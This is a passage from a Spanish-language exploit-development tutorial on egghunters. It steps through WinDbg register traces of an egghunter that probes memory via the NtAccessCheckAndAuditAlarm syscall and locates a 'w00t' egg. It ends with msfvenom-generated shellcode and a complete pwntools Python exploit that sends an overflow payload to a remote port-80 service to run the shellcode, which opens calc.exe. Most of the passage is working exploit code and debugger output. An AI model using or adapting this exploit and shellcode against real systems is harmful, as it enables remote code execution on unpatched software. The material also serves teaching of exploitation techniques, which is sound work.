eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00000000 esi=018f2aa8 edi=0041703c  
eip=01c8ea8f esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea8f 6681caff0f      or      dx,0FFFh

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00000fff esi=018f2aa8 edi=0041703c  
eip=01c8ea94 esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
01c8ea94 42              inc     edx

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea95 esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216  
01c8ea95 52              push    edx</span>
</code></pre></div></div><br>

<p class="plain-text">Guarda el valor actual de edx y establece el valor de <code class="language-plaintext highlighter-rouge">eax</code> al syscall NR que en el caso de la función NtAccessCheckAndAuditAlarm es <code class="language-plaintext highlighter-rouge">0x1c9</code>, seguido a ello hace la syscall</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea95 esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216  
01c8ea95 52              push    edx

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea96 esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216  
01c8ea96 31c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea98 esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea98 66b8c901        mov     ax,1C9h

</span><span class="ro">0:000> </span><span class="p">p
eax=000001c9 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea9c esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea9c cd2e            int     2Eh

</span><span class="ro">0:000> </span><span class="p">p
eax=c0000005 ebx=018f2aa8 ecx=01c8ea20 edx=01c8ea9e esi=018f2aa8 edi=0041703c  
eip=01c8ea9e esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea9e 3c05            cmp     al,5</span>
</code></pre></div></div><br>

<p class="plain-text">Compara el valor devuelto en eax con <code class="language-plaintext highlighter-rouge">0xc0000005</code>, si ese es el valor la dirección no es valida por lo que vuelve a aumentar el valor en <code class="language-plaintext highlighter-rouge">0x1000</code> y repite el proceso de nuevo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=c0000005 ebx=018f2aa8 ecx=01c8ea20 edx=01c8ea9e esi=018f2aa8 edi=0041703c
eip=01c8ea9e esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01c8ea9e 3c05            cmp     al,5

</span><span class="ro">0:000> </span><span class="p">p
eax=c0000005 ebx=018f2aa8 ecx=01c8ea20 edx=01c8ea9e esi=018f2aa8 edi=0041703c
eip=01c8eaa0 esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01c8eaa0 5a              pop     edx

</span><span class="ro">0:000> </span><span class="p">p
eax=c0000005 ebx=018f2aa8 ecx=01c8ea20 edx=00001000 esi=018f2aa8 edi=0041703c
eip=01c8eaa1 esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01c8eaa1 74ea            je      01c8ea8f                                [br=1]  

</span><span class="ro">0:000> </span><span class="p">u 01c8ea8f
01c8ea8f 6681caff0f      or      dx,0FFFh
01c8ea94 42              inc     edx
01c8ea95 52              push    edx
01c8ea96 31c0            xor     eax,eax
01c8ea98 66b8c901        mov     ax,1C9h
01c8ea9c cd2e            int     2Eh
01c8ea9e 3c05            cmp     al,5</span>
</code></pre></div></div><br>

<p class="plain-text">Cuando la dirección es válida el valor devuelto será diferente por lo que no se cumple la condición y <code class="language-plaintext highlighter-rouge">je</code> no saltará a aumentar la página y seguira con el flujo normal</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=c000005c ebx=01a92aa8 ecx=0392ea20 edx=003a1000 esi=01a92aa8 edi=0041703c
eip=0392eaa1 esp=0392ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
0392eaa1 74ec            je      0392ea8f                                [br=0]

</span><span class="ro">0:000> </span><span class="p">p
eax=c000005c ebx=01a92aa8 ecx=0392ea20 edx=003a1000 esi=01a92aa8 edi=0041703c
eip=0392eaa3 esp=0392ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
0392eaa3 b877303074      mov     eax,74303077h</span>
</code></pre></div></div><br>

<p class="plain-text">Después de ello guarda en eax los bytes en hex de la cadena <code class="language-plaintext highlighter-rouge">w00t</code> y en edi la dirección, usando <code class="language-plaintext highlighter-rouge">scasd</code> compara el valor de eax con el contenido dentro de <code class="language-plaintext highlighter-rouge">edi</code>, pero como ahora mismo el valor de edi es <code class="language-plaintext highlighter-rouge">0x00400000</code> la comparación fallará</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=c000005c ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=0041703c
eip=01adeaa3 esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
01adeaa3 b877303074      mov     eax,74303077h

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=0041703c
eip=01adeaa8 esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
01adeaa8 89d7            mov     edi,edx

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=00400000
eip=01adeaaa esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
01adeaaa af              scas    dword ptr es:[edi]   es:0023:00400000=00905a4d  

</span><span class="ro">0:000> </span><span class="p">db 0x00400000 L4
00400000  4d 5a 90 00                                      MZ..</span>
</code></pre></div></div><br>

<p class="plain-text">Si la comparación falla es que aun no ha encontrado el huevo que enviamos antes del shellcode por lo que volvera a incrementar la dirección en una unidad</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=74303077 ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=00400000
eip=01adeaaa esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
01adeaaa af              scas    dword ptr es:[edi]   es:0023:00400000=00905a4d  

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=00400004
eip=01adeaab esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
01adeaab 75e7            jne     01adea94                                [br=1]  

</span><span class="ro">0:000> </span><span class="p">u 01adea94
01adea94 42              inc     edx
01adea95 52              push    edx
01adea96 31c0            xor     eax,eax
01adea98 66b8c901        mov     ax,1C9h
01adea9c cd2e            int     2Eh
01adea9e 3c05            cmp     al,5
01adeaa0 5a              pop     edx
01adeaa1 74ec            je      01adea8f</span>
</code></pre></div></div><br>

<p class="plain-text">Para ahorrar tiempo buscaremos el huevo en toda la memoria y la dirección donde sabemos que esta la guardaremos en <code class="language-plaintext highlighter-rouge">edi</code> para asi cumplir la condición</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">s -a 0 L?80000000 w00tw00t
03be8183  77 30 30 74 77 30 30 74-43 43 43 43 43 43 43 43  w00tw00tCCCCCCCC  

</span><span class="ro">0:000> </span><span class="p">r edi=0x03be8183</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora cuando compara el contenido de <code class="language-plaintext highlighter-rouge">edi</code> con <code class="language-plaintext highlighter-rouge">eax</code> la condicion se cumple por lo que no aumentara la dirección sino que seguira con el flujo del programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be8183
eip=037deaaa esp=037dea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
037deaaa af              scas    dword ptr es:[edi]   es:0023:03be8183=74303077

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be8187
eip=037deaab esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deaab 75e7            jne     037dea94                                [br=0]

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be8187
eip=037deaad esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deaad af              scas    dword ptr es:[edi]   es:0023:03be8187=743030773</span>
</code></pre></div></div><br>

<p class="plain-text">Si lo encuentra una vez volvera a comprobar que los siguientes <code class="language-plaintext highlighter-rouge">bytes</code> son nuevamente del huevo, esto como dijimos antes se hace para evitar falsos positivos, si la comparación es igual la siguiente instrucción saltará al registro <code class="language-plaintext highlighter-rouge">edi</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be8187
eip=037deaad esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deaad af              scas    dword ptr es:[edi]   es:0023:03be8187=74303077  

</span><span class="ro">0:000> </span><span class="p">db edi L10
03e8c19f  77 30 30 74 43 43 43 43-43 43 43 43 43 43 43 43  w00tCCCCCCCCCCCC

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be818b
eip=037deaae esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deaae 75e4            jne     037dea94                                [br=0]  

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be818b
eip=037deab0 esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deab0 ffe7            jmp     edi {03be818b}</span>
</code></pre></div></div><br>

<p class="plain-text">Y como el registro <code class="language-plaintext highlighter-rouge">edi</code> apunta a nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> cuando salte ejecutará las instrucciones que enviemos después del huevo, asi logramos ejecutar el shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db edi
03be818b  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be819b  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81ab  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81bb  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81cb  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81db  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81eb  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81fb  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be818b  
eip=03be818b esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
03be818b 43              inc     ebx</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos una forma de ejecutar instrucciones podemos generar un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code> que en caso de interpretarse ejecute el comando <code class="language-plaintext highlighter-rouge">calc.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/exec CMD=calc.exe -f python -v shellcode -b </span><span class="am">'\x00\x0a\x0d'</span><span class="p"> -e x86/jmp_call_additive  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 225 (iteration=0)
x86/jmp_call_additive chosen with final size 225
Payload size: 225 bytes
Final size of python file: 1274 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\xb5\xf0\xa4\xca\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x49\x18\x26\xca\xb1\xd9\x47\x42"
shellcode += b"\x54\xe8\x47\x30\x1d\x5b\x78\x32\x73\x50\xf3"
shellcode += b"\x16\x67\xe3\x71\xbf\x88\x44\x3f\x99\xa7\x55"
shellcode += b"\x6c\xd9\xa6\xd5\x6f\x0e\x08\xe7\xbf\x43\x49"
shellcode += b"\x20\xdd\xae\x1b\xf9\xa9\x1d\x8b\x8e\xe4\x9d"
shellcode += b"\x20\xdc\xe9\xa5\xd5\x95\x08\x87\x48\xad\x52"
shellcode += b"\x07\x6b\x62\xef\x0e\x73\x67\xca\xd9\x08\x53"
shellcode += b"\xa0\xdb\xd8\xad\x49\x77\x25\x02\xb8\x89\x62"
shellcode += b"\xa5\x23\xfc\x9a\xd5\xde\x07\x59\xa7\x04\x8d"
shellcode += b"\x79\x0f\xce\x35\xa5\xb1\x03\xa3\x2e\xbd\xe8"
shellcode += b"\xa7\x68\xa2\xef\x64\x03\xde\x64\x8b\xc3\x56"
shellcode += b"\x3e\xa8\xc7\x33\xe4\xd1\x5e\x9e\x4b\xed\x80"
shellcode += b"\x41\x33\x4b\xcb\x6c\x20\xe6\x96\xfa\xb7\x74"
shellcode += b"\xad\x49\xb7\x86\xad\xfd\xd0\xb7\x26\x92\xa7"
shellcode += b"\x47\xed\xd6\x58\x02\xaf\x7f\xf1\xcb\x3a\xc2"
shellcode += b"\x9c\xeb\x91\x01\x99\x6f\x13\xfa\x5e\x6f\x56"
shellcode += b"\xff\x1b\x37\x8b\x8d\x34\xd2\xab\x22\x34\xf7"
shellcode += b"\xc8\xa5\xa6\x9b\x20\x43\x4f\x39\x3c\x8b\xaf"
shellcode += b"\xc1\x3c\x8b\xaf\xc1"</span>
</code></pre></div></div><br>

<p class="plain-text">El exploit final guardará el huevo <code class="language-plaintext highlighter-rouge">w00tw00t</code> seguido del shellcode en algun lugar de la memoria y al ejecutar el <code class="language-plaintext highlighter-rouge">egghunter</code> este lo buscara y cuando lo encuentre lo ejecutará</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
egghunter </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\xb8\xc9\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7</span><span class="s">"</span><span class="p">  

shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\xbb\xc2\x02\xd8\xe2\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x3e\xea\x5a\xe2\xbe\xeb\x3a\x6a</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5b\xda\x7a\x08\x28\x4d\x4b\x5a\x7c\x62\x20</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0e\x94\xf1\x44\x87\x9b\xb2\xe3\xf1\x92\x43</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5f\xc1\xb5\xc7\xa2\x16\x15\xf9\x6c\x6b\x54</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3e\x90\x86\x04\x97\xde\x35\xb8\x9c\xab\x85</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x33\xee\x3a\x8e\xa0\xa7\x3d\xbf\x77\xb3\x67</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1f\x76\x10\x1c\x16\x60\x75\x19\xe0\x1b\x4d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd5\xf3\xcd\x9f\x16\x5f\x30\x10\xe5\xa1\x75</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x97\x16\xd4\x8f\xeb\xab\xef\x54\x91\x77\x65</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4e\x31\xf3\xdd\xaa\xc3\xd0\xb8\x39\xcf\x9d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xcf\x65\xcc\x20\x03\x1e\xe8\xa9\xa2\xf0\x78</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe9\x80\xd4\x21\xa9\xa9\x4d\x8c\x1c\xd5\x8d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6f\xc0\x73\xc6\x82\x15\x0e\x85\xc8\xe8\x9c</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb0\xbf\xeb\x9e\xba\xef\x83\xaf\x31\x60\xd3</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x90\xc4\x2b\x7a\xb8\x6d\xa4\x23\x29\x2c</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa9\xd3\x84\x73\xd4\x57\x2c\x0c\x23\x47\x45</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x09\x6f\xcf\xb6\x63\xe0\xba\xb8\xd0\x01\xef</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xdb\xb7\x91\x73\x35\x5d\x12\x11\x49\x9d\xe2</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd9\x49\x9d\xe2\xd9</span><span class="s">"</span><span class="p">

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(egghunter))

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">ret

method </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)

content  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
content </span><span class="o">+= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">
content </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Como resultado conseguimos controlar el programa y ejecutar el shellcode que ejecuta el comando <code class="language-plaintext highlighter-rouge">calc.exe</code> por lo que se abre una calculadora en la maquina</p>
<a href="/exploitdevelopment/egghunters/2.png" target="_blank"><div><p><img src="/exploitdevelopment/egghunters/2.png"></p></div></a>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
